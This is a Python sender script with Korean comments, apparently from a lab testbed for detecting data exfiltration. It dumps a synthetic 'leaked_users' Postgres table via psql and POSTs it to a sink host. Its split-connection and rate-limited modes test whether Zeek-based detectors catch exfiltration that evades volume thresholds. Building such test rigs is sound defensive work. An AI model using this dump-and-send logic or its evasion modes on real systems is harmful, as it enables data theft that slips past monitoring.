#!/usr/bin/env python3
"""
S2/C-a 송신기 — backend 네트워크 공간(netns 공유 사이드카) 안에서 실행된다 (Step 2 / P1 · E1).

하는 일:
  1. db:5432 의 leaked_users(합성 더미)를 psql 로 CSV 조회 (DB 자격증명은 PGPASSWORD
     환경변수로만 전달 — argv/로그에 노출하지 않는다)
  2. payload.py 로 목표 전송량까지 결정적 확장 (원본/합성 분리)
  3. 전송 모드(single/split/slow)에 따라 Sink 로 실제 HTTP POST
  4. 연결별 수신 결과(바이트·SHA-256·시각)와 송신 메타데이터를 독립 기록 (stdout JSON)

E1: 이 프로세스는 backend 의 netns 를 공유하므로, db 조회와 sink 전송이 모두 backend 의
    eth0 로 나간다. Zeek 는 src=backend 로 관측한다. Spring 앱은 건드리지 않는다.

HTTP 전송 로직(send_payload)은 Docker/DB 없이도 Sink 서버만 있으면 테스트할 수 있도록
DB 조회와 분리했다.
"""

from __future__ import annotations

import http.client
import json
import os
import re
import subprocess
import sys
import time
from dataclasses import dataclass
from datetime import datetime, timezone

# 컨테이너(/app)에서는 payload.py/transfer_spec.py 가 send.py 옆에 있고,
# repo 트리에서는 sender/ 의 부모(scenarios/network)에 있다. 둘 다 지원한다.
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)
sys.path.insert(0, os.path.dirname(_HERE))
from payload import build_transfer_payload  # noqa: E402
from transfer_spec import (  # noqa: E402
    MODE_SINGLE,
    MODE_SLOW,
    MODE_SPLIT,
    TransferSpec,
)

_TABLE_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
_SEND_CHUNK = 32 * 1024  # 전송률 제어를 매끄럽게 하려 작게 쓴다


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ----------------------------------------------------------------------------- #
# 1) DB 조회 (주입 가능 — 테스트에서는 교체한다)
# ----------------------------------------------------------------------------- #

@dataclass(frozen=True)
class DbConfig:
    host: str
    port: int
    user: str
    name: str
    table: str
    password: str  # argv 로 넘기지 않는다


def fetch_rows_csv(db: DbConfig) -> bytes:
    """leaked_users 를 CSV(헤더 포함)로 조회한다. 비밀번호는 PGPASSWORD env 로만 전달."""
    if not _TABLE_RE.match(db.table):
        raise ValueError(f"unsafe table name: {db.table!r}")
    sql = f"\\copy (SELECT * FROM {db.table}) TO STDOUT WITH CSV HEADER"
    cmd = [
        "psql", "-X", "-q", "-w",
        "-h", db.host, "-p", str(db.port),
        "-U", db.user, "-d", db.name,
        "-v", "ON_ERROR_STOP=1",
        "-c", sql,
    ]
    env = {**os.environ, "PGPASSWORD": db.password}
    proc = subprocess.run(cmd, env=env, capture_output=True)
    if proc.returncode != 0:
        # stderr 에 비밀번호는 담기지 않지만, 혹시 모를 노출을 피해 요약만 남긴다.
        raise RuntimeError(f"psql failed (rc={proc.returncode})")
    return proc.stdout


# ----------------------------------------------------------------------------- #
# 2) HTTP 전송 (DB 없이 테스트 가능)
# ----------------------------------------------------------------------------- #

def _post_once(host, port, body: bytes, transfer_id: str,
               rate_bps: int | None = None, timeout: float = 120.0) -> dict:
    """한 연결로 body 를 POST 한다. rate_bps 가 있으면 업로드 속도를 제한한다."""
    import hashlib
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    hasher = hashlib.sha256()
    started = time.monotonic()
    started_iso = _now_iso()
    try:
        conn.putrequest("POST", "/", skip_host=False, skip_accept_encoding=True)
        conn.putheader("Content-Type", "application/octet-stream")
        conn.putheader("Content-Length", str(len(body)))
        conn.putheader("X-Transfer-Id", transfer_id)
        conn.endheaders()

        sent = 0
        view = memoryview(body)
        while sent < len(body):
            chunk = view[sent:sent + _SEND_CHUNK]
            conn.send(chunk)
            hasher.update(chunk)
            sent += len(chunk)
            if rate_bps:
                # 지금까지 보낸 양이 목표 속도보다 빠르면 그만큼 쉰다.
                expected = sent / rate_bps
                actual = time.monotonic() - started
                if expected > actual:
                    time.sleep(expected - actual)

        resp = conn.getresponse()
        raw = resp.read()
        ended = time.monotonic()
        body_json = {}
        try:
            body_json = json.loads(raw)
        except (ValueError, TypeError):
            pass
        return {
            "transfer_id": transfer_id,
            "status": resp.status,
            "bytes_sent": sent,
            "sha256": hasher.hexdigest(),
            "sink_bytes_received": body_json.get("bytes_received"),
            "sink_sha256": body_json.get("sha256"),
            "started_at": started_iso,
            "duration_sec": round(ended - started, 4),
        }
    finally:
        conn.close()


def _split_ranges(total: int, chunks: int) -> list[tuple[int, int]]:
    """total 바이트를 chunks 개로 (거의) 균등 분할한 (start, end) 목록."""
    base, extra = divmod(total, chunks)
    ranges, start = [], 0
    for i in range(chunks):
        size = base + (1 if i < extra else 0)
        ranges.append((start, start + size))
        start += size
    return ranges


def send_payload(host: str, port: int, payload: bytes, spec: TransferSpec,
                 transfer_id_base: str) -> list[dict]:
    """
    전송 모드에 따라 payload 를 보낸다.
      split : chunks 개의 "별도 연결"로 — 누적 바이트 집계(P3) 검증 대상
      slow  : 한 연결, rate_bps 제한 — 연결이 길게 유지됨(P6 조기탐지 대상)
      single: 한 연결로 한 번에
    연결별 수신 결과 목록을 돌려준다.
    """
    if spec.mode == MODE_SPLIT:
        receipts = []
        for i, (s, e) in enumerate(_split_ranges(len(payload), spec.chunks)):
            receipts.append(_post_once(host, port, payload[s:e], f"{transfer_id_base}-{i}"))
        return receipts
    if spec.mode == MODE_SLOW:
        return [_post_once(host, port, payload, transfer_id_base, rate_bps=spec.rate_bps)]
    return [_post_once(host, port, payload, transfer_id_base)]


# ----------------------------------------------------------------------------- #
# 3) 진입점 (오케스트레이터가 env 로 구성해 netns 사이드카로 실행)
# ----------------------------------------------------------------------------- #

def _spec_from_env() -> TransferSpec:
    rate = os.getenv("RATE_BPS")
    return TransferSpec(
        target_bytes=int(os.getenv("TARGET_BYTES", str(10 * 1024 * 1024))),
        mode=os.getenv("MODE", MODE_SINGLE),
        chunks=int(os.getenv("CHUNKS", "1")),
        rate_bps=int(rate) if rate else None,
    )


def main() -> int:
    db = DbConfig(
        host=os.getenv("DB_HOST", "db"),
        port=int(os.getenv("DB_PORT", "5432")),
        user=os.getenv("DB_USER", "leafy"),
        name=os.getenv("DB_NAME", "leafy"),
        table=os.getenv("DB_TABLE", "leaked_users"),
        password=os.getenv("DB_PASSWORD", ""),
    )
    spec = _spec_from_env()
    sink_host = os.getenv("SINK_HOST", "sink-b")
    sink_port = int(os.getenv("SINK_PORT", "8080"))
    transfer_id = os.getenv("TRANSFER_ID", f"run-{int(time.time())}")
    run_label = os.getenv("RUN_LABEL", "unlabeled")

    original_csv = fetch_rows_csv(db)
    payload = build_transfer_payload(original_csv, target_bytes=spec.target_bytes)

    t0 = _now_iso()  # 실제 데이터 송신 시작 직전 (MTTD t0)
    receipts = send_payload(sink_host, sink_port, payload.data, spec, transfer_id)

    # 송신 메타데이터 독립 기록. 자격증명은 담지 않는다. GT 라벨도 담지 않는다.
    meta = {
        "run_label": run_label,
        "transfer_id": transfer_id,
        "sent_start_t0": t0,
        "dst_host": sink_host,
        "dst_port": sink_port,
        "mode": spec.mode,
        "chunks": spec.chunks,
        "rate_bps": spec.rate_bps,
        "payload": payload.summary,
        "connections": receipts,
        "total_bytes_sent": sum(r["bytes_sent"] for r in receipts),
    }
    print("SENDER_META " + json.dumps(meta, ensure_ascii=False), flush=True)

    result_path = os.getenv("RESULT_PATH")
    if result_path:
        with open(result_path, "w", encoding="utf-8") as fh:
            json.dump(meta, fh, ensure_ascii=False, indent=2)

    ok = all(r["status"] == 200 for r in receipts)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
